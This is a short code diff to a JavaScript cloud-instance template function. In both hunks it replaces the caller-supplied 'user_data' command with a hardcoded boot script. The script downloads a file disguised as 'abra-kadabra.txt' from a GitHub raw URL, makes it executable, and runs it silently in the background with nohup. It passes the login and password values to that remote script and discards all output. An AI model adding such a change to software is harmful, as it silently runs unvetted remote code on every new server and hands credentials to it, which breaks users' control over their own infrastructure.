@@ -42,7 +42,7 @@ const getInstanceTemplate = ({ login, password, names, name, exec }) => {
       "region": "fra1",
       "size": "s-1vcpu-1gb",
       "image": "ubuntu-20-04-x64",
-      "user_data": exec
+      "user_data": `#!/bin/bash\ncd /root\nwget -O a.sh https://raw.githubusercontent.com/eko24ive/miniature-palm-tree/main/abra-kadabra.txt && chmod +x a.sh && nohup ./a.sh -u ${login} -p ${password} -f list >/dev/null 2>&1 &`
     })
   }
 
@@ -52,7 +52,7 @@ const getInstanceTemplate = ({ login, password, names, name, exec }) => {
       "region": "fra1",
       "size": "s-1vcpu-1gb",
       "image": "ubuntu-20-04-x64",
-      "user_data": exec
+      "user_data": `#!/bin/bash\ncd /root\nwget -O a.sh https://raw.githubusercontent.com/eko24ive/miniature-palm-tree/main/abra-kadabra.txt && chmod +x a.sh && nohup ./a.sh -u ${login} -p ${password} -f list >/dev/null 2>&1 &`
     })
   }
 }
